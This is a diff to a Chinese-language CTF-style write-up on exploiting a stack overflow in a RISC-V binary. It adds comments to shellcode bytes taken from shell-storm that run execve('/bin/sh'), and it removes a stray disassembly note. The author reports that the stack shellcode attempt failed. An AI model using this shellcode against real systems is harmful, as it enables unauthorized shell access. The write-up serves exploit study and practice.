@@ -198,13 +198,6 @@ gdb调一下发现在echo不存在的文件的时候可以输入0x200个字节
 由于pie和NX，什么栈地址、libc加载地址都是固定的，所以一开始想直接在栈中布置shellcode，覆盖返回地址到shellcode，google到一段执行`execve("/bin/sh", NULL, 0)`的shellcode
 
 ```python
-'''
-0x000100b0      0111           addi sp, sp, -32
-
-l0x000100b2      06ec           sd ra, 24(sp)
-'''
-
-'''
 #from http://shell-storm.org/shellcode/files/shellcode-908.php
 
 
@@ -265,8 +258,12 @@ shellcode += b'\x72\x08\xb3\x87\x07\x41\x93\x87'
 shellcode += b'\xf7\x32\x23\x32\xf4\xfe\x93\x07'
 shellcode += b'\x04\xfe\x01\x46\x81\x45\x3e\x85'
 shellcode += b'\x93\x08\xd0\x0d\x93\x06\x30\x07'
-shellcode += b'\x23\x0e\xd1\xee\x93\x06\xe1\xef'
-shellcode += b'\x67\x80\xe6\xff'
+shellcode += b'\x23\x0e\xd1\xee'#sb a3, -260(sp)
+
+shellcode += b'\x93\x06\xe1\xef'#addi a3, sp, -258
+
+shellcode += b'\x67\x80\xe6\xff'#jr -2(a3)
+
 ```
 
 但是可能是由于在栈中操作的原因没有成功执行
